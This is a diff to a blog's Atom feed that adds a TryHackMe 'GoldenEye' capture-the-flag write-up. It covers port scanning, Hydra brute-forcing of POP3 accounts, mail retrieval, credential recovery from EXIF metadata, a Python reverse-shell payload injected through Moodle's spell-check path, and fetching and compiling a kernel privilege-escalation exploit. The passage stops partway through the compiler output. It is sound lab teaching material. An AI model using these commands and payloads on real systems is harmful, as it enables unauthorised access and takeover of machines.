@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/ctf/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-05-31T15:36:42+00:00</updated>
+  <updated>2021-06-27T14:45:30+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/ctf/feed.xml</id>
 
   
@@ -30,6 +30,609 @@
   
   
 
+  
+    <entry>
+      <title type="html">GoldenEye Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/goldeneye" rel="alternate" type="text/html" title="GoldenEye Write Up" />
+      <published>2021-06-27T00:00:00+00:00</published>
+      <updated>2021-06-27T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/goldeneye</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/goldeneye">&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/goldeneye&quot;&gt;goldeneye&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. The machine was pretty easy, it just needed good enumeration.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.50.94
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:39 BST
+Nmap scan report for 10.10.50.94
+Host is up (0.031s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: TLS randomness does not represent time
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.44 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;25 - smtp - Postfix smtpd&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache httpd 2.4.7&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I ran a full port scan and found 2 more ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/allports 10.10.50.94
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:40 BST
+Nmap scan report for 10.10.50.94
+Host is up (0.034s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+25/tcp    open  smtp
+80/tcp    open  http
+55006/tcp open  unknown
+55007/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then completed a targeted scan against the 4 ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p 25,80,55006,55007 -sC -sV -oA nmap/targeted 10.10.50.94
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:54 BST
+Nmap scan report for 10.10.50.94
+Host is up (0.030s latency).
+
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: TLS randomness does not represent time
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+55006/tcp open  ssl/unknown
+|_ssl-date: TLS randomness does not represent time
+55007/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: UIDL USER RESP-CODES AUTH-RESP-CODE SASL(PLAIN) CAPA STLS PIPELINING TOP
+|_ssl-date: TLS randomness does not represent time
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 109.38 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
+
+&lt;p&gt;I started by looking at the HTTP port.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The webpage tells us to go to /sev-home/ however the page is password protected and currently I have no usernames or password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/loginprompt.png&quot; alt=&quot;loginprompt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I checked the source code for the webpage.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;GoldenEye Primary Admin Server&amp;lt;/title&amp;gt;
+&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;index.css&quot;&amp;gt;
+&amp;lt;/head&amp;gt;
+
+	&amp;lt;span id=&quot;GoldenEyeText&quot; class=&quot;typeing&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;span class='blinker'&amp;gt;&amp;amp;#32;&amp;lt;/span&amp;gt;
+
+&amp;lt;script src=&quot;terminal.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+	
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Not a great deal in there but there is a javascript file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;var data = [
+  {
+    GoldenEyeText: &quot;&amp;lt;span&amp;gt;&amp;lt;br/&amp;gt;Severnaya Auxiliary Control Station&amp;lt;br/&amp;gt;****TOP SECRET ACCESS****&amp;lt;br/&amp;gt;Accessing Server Identity&amp;lt;br/&amp;gt;Server Name:....................&amp;lt;br/&amp;gt;GOLDENEYE&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;User: UNKNOWN&amp;lt;br/&amp;gt;&amp;lt;span&amp;gt;Naviagate to /sev-home/ to login&amp;lt;/span&amp;gt;&quot;
+  }
+];
+
+//
+//Boris, make sure you update your default password. 
+//My sources say MI6 maybe planning to infiltrate. 
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&amp;amp;#73;&amp;amp;#110;&amp;amp;#118;&amp;amp;#105;&amp;amp;#110;&amp;amp;#99;&amp;amp;#105;&amp;amp;#98;&amp;amp;#108;&amp;amp;#101;&amp;amp;#72;&amp;amp;#97;&amp;amp;#99;&amp;amp;#107;&amp;amp;#51;&amp;amp;#114;
+//
+//BTW Natalya says she can break your codes
+//
+
+var allElements = document.getElementsByClassName(&quot;typeing&quot;);
+for (var j = 0; j &amp;lt; allElements.length; j++) {
+  var currentElementId = allElements[j].id;
+  var currentElementIdContent = data[0][currentElementId];
+  var element = document.getElementById(currentElementId);
+  var devTypeText = currentElementIdContent;
+
+ 
+  var i = 0, isTag, text;
+  (function type() {
+    text = devTypeText.slice(0, ++i);
+    if (text === devTypeText) return;
+    element.innerHTML = text + `&amp;lt;span class='blinker'&amp;gt;&amp;amp;#32;&amp;lt;/span&amp;gt;`;
+    var char = text.slice(-1);
+    if (char === &quot;&amp;lt;&quot;) isTag = true;
+    if (char === &quot;&amp;gt;&quot;) isTag = false;
+    if (isTag) return type();
+    setTimeout(type, 60);
+  })();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Few things to note in here, we have 2 names (boris, natalya) and an encoded password. I went to &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;Cyber Chef&lt;/a&gt; to decode the password. Using the magic function the string is decoded from HTLM Entity to clear text.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/cyberchefjscode.png&quot; alt=&quot;cyberchefjscode&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the the username ‘boris’ and password from cyberchef I can now login to the webpage.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/loggedinwebpage.png&quot; alt=&quot;loggedinwebpage&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)&lt;/p&gt;
+
+  &lt;p&gt;Please email a qualified GNO supervisor to receive the online &lt;strong&gt;GoldenEye Operators Training&lt;/strong&gt; to become an Administrator of the GoldenEye system&lt;/p&gt;
+
+  &lt;p&gt;Remember, since &lt;strong&gt;&lt;em&gt;security by obscurity&lt;/em&gt;&lt;/strong&gt; is very effective, we have configured our pop3 service to run on a very high non-default port&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Its now time to turn attention to the smtp/pop3 ports.&lt;/p&gt;
+
+&lt;h3 id=&quot;email-enumeration&quot;&gt;Email Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Reviewing the nmap output, port 25 SMTP allows the VRFY command however not AUTH. Port 55007 POP3 does allow authentication, I tried to login using the credentials found for boris but they didnt work.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/pop3boris.png&quot; alt=&quot;pop3boris&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using Hydra I was able to brute force boris’s password.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Normaly I would use rockyou.txt however after around 30 minutes I had no hits so swapped to the much smaller wordlist fasttrack and got a hit after a minute or so.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l boris -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:00:47
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.50.94:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.50.94   login: boris   password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:03:34
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I repeated the process for natalya.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:05:44
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.50.94:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.50.94   login: natalya   password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
+[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:07:45
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I had some credentials it was time to login and check for any email messages, to do this I used netcat to connect to the POP3 service and authentication and use the ‘LIST’ and ‘RETR’ commands to list and retrieve messages.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A list of POP3 commands can be found &lt;a href=&quot;https://www.shellhacks.com/retrieve-email-pop3-server-command-line/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER boris
++OK
+PASS &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
++OK Logged in.
+list
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+RETR 1
++OK 544 octets
+Return-Path: &amp;lt;root@127.0.0.1.goldeneye&amp;gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id D9E47454B1
+        for &amp;lt;boris&amp;gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: &amp;lt;20180425022326.D9E47454B1@ubuntu&amp;gt;
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the ot
+her admins here.
+.
+RETR 2
++OK 373 octets
+Return-Path: &amp;lt;natalya@ubuntu&amp;gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id C3F2B454B1
+        for &amp;lt;boris&amp;gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: &amp;lt;20180425024249.C3F2B454B1@ubuntu&amp;gt;
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+RETR 3
++OK 921 octets
+Return-Path: &amp;lt;alec@janus.boss&amp;gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+        for &amp;lt;boris&amp;gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: &amp;lt;20180425025235.4B9F4454B1@ubuntu&amp;gt;
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this s
+erver then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and capture
+d our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+
+.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I repeated the same process for natalya.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
++OK GoldenEye POP3 Electronic-Mail System
+user natalya
++OK
+pass &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
++OK Logged in.
+list
++OK 2 messages:
+1 631
+2 1048
+.
+retr 1
++OK 631 octets
+Return-Path: &amp;lt;root@ubuntu&amp;gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id D5EDA454B1
+        for &amp;lt;natalya&amp;gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: &amp;lt;20180425024542.D5EDA454B1@ubuntu&amp;gt;
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+RETR 2
++OK 1048 octets
+Return-Path: &amp;lt;root@ubuntu&amp;gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 17C96454B1
+        for &amp;lt;natalya&amp;gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: &amp;lt;20180425031956.17C96454B1@ubuntu&amp;gt;
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even
+ if it's not, just enter it in under the guise of &quot;security&quot;...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+
+.
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great more credentials and a new HTTP endpoint. I added the details to my /etc/hosts file and navigated to http://severnaya-station.com/gnocertdir/&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/moodle.png&quot; alt=&quot;moodle&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Logging in as xenia a message notification popped up, using the notification I was navigated to the users messages.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/xeniamessage.png&quot; alt=&quot;xeniamessage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A new email username is ‘doak’&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:16:54
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+[DATA] attacking pop3://10.10.50.94:55007/
+[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
+[55007][pop3] host: 10.10.50.94   login: doak   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:19:23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Repeating the same process as before, I brute forced the users password and logged in to POP3 service to check for messages.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
++OK GoldenEye POP3 Electronic-Mail System
+user doak
++OK
+pass &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
++OK Logged in.
+list
++OK 1 messages:
+1 606
+.
+RETR 1
++OK 606 octets
+Return-Path: &amp;lt;doak@ubuntu&amp;gt;
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+        by ubuntu (Postfix) with SMTP id 97DC24549D
+        for &amp;lt;doak&amp;gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: &amp;lt;20180425034731.97DC24549D@ubuntu&amp;gt;
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
+
+.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I logged out of http://severnaya-station.com/gnocertdir/ as xenia and logged in as dr_doak. Looking around the webpage I found private files for james.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/privatefiles.png&quot; alt=&quot;privatefiles&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I downloaded the file to my machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat s3cret.txt 
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt. 
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Navigating to http://severnaya-station.com/dir007key/for-007.jpg I found an image:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/for-007.jpg&quot; alt=&quot;007&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I downloaded the file and used exiftools to check for any credentials.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $exiftool for-007.jpg 
+ExifTool Version Number         : 11.97
+File Name                       : for-007.jpg
+Directory                       : .
+File Size                       : 15 kB
+File Modification Date/Time     : 2021:06:27 12:27:18+01:00
+File Access Date/Time           : 2021:06:27 12:27:18+01:00
+File Inode Change Date/Time     : 2021:06:27 12:27:18+01:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+X Resolution                    : 300
+Y Resolution                    : 300
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Image Description               : eFdpbnRlcjE5OTV4IQ==
+Make                            : GoldenEye
+Resolution Unit                 : inches
+Software                        : linux
+Artist                          : For James
+Y Cb Cr Positioning             : Centered
+Exif Version                    : 0231
+Components Configuration        : Y, Cb, Cr, -
+User Comment                    : For 007
+Flashpix Version                : 0100
+Image Width                     : 313
+Image Height                    : 212
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 313x212
+Megapixels                      : 0.066
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The image description looks like base64 so using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;echo -n &quot;eFdpbnRlcjE5OTV4IQ==&quot; | base64 -d&lt;/code&gt; I was able to retrieve the admin password.&lt;/p&gt;
+
+&lt;h3 id=&quot;shell&quot;&gt;Shell&lt;/h3&gt;
+
+&lt;p&gt;As an admin on moodle we get a lot more options, the moodle version is 2.2.3, googleing for ‘moodle 2.2.3 exploit’, the first result provides an &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec/&quot;&gt;exploit&lt;/a&gt; using the spell check function. Reading the source code it looks fairly straight forward so I decided to do manualy rather than use Metasploit.&lt;/p&gt;
+
+&lt;p&gt;First I updated the system path with the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;&amp;lt;local machine IP&amp;gt;&amp;gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/systempath.png&quot; alt=&quot;systempath&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next I changed the shell engine to use ‘PSpellShell’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/updatedshell.png&quot; alt=&quot;updatedshell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I started a netcat listener on my local machine and then on the webpage went to add a post, once the editor loaded and clicked spell check and got a shell!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/spellcheck.png&quot; alt=&quot;spellcheck&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [&amp;lt;&amp;lt;REDACTED&amp;gt;&amp;gt;] from (UNKNOWN) [10.10.50.94] 55215
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;The machine is running linux 3.13.0-32, googeling linux 3.13.0-32 priv esc I found a linux kernal exploit. Details of the exploit can be found &lt;a href=&quot;https://www.cvedetails.com/cve/cve-2015-1328&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I downloaded the &lt;a href=&quot;https://www.exploit-db.com/exploits/37292&quot;&gt;exploit code&lt;/a&gt; from exploit-db and copied it to machine using python.&lt;/p&gt;
+
+&lt;h5 id=&quot;my-machine&quot;&gt;My machine&lt;/h5&gt;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
+└──╼ $mv ~/Downloads/37292.c .
+┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
+└──╼ $ls
+37292.c  for-007.jpg  nmap  s3cret.txt
+┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
+└──╼ $mv 37292.c exploit.c
+┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
+└──╼ $sudo python3 -m http.server 80
+[sudo] password for daz: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5 id=&quot;victim&quot;&gt;Victim&lt;/h5&gt;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ wget http://&amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;/exploit.c
+--2021-06-27 04:54:42--  http://&amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;/exploit.c
+Connecting to &amp;lt;&amp;lt;machine IP&amp;gt;&amp;gt;:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5119 (5.0K) [text/x-csrc]
+Saving to: 'exploit.c'
+
+100%[======================================&amp;gt;] 5,119       --.-K/s   in 0.003s
+
+2021-06-27 04:54:42 (1.83 MB/s) - 'exploit.c' saved [5119/5119]
+
+www-data@ubuntu:/tmp$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The code provides the compile intructions, I simply need to run gcc and specific the output flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ gcc exploit.c exploit
+The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
+www-data@ubuntu:/tmp$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;GCC is not installed however I can use ‘cc’. However for the exploit to work I need to change a line in the file to reference cc rather than gcc.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lib = system(&quot;cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Now the line has changed I can use cc to compile the code.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu:/tmp$ cc exploit.c -o exploit
+exploit.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
+}
+^
+exploit.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
+        if(unshare(CLONE_NEWUSER) != 0)
+           ^
+exploit.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+                ^
+exploit.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
+            waitpid(pid, &amp;amp;status, 0);
+            ^
+exploit.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
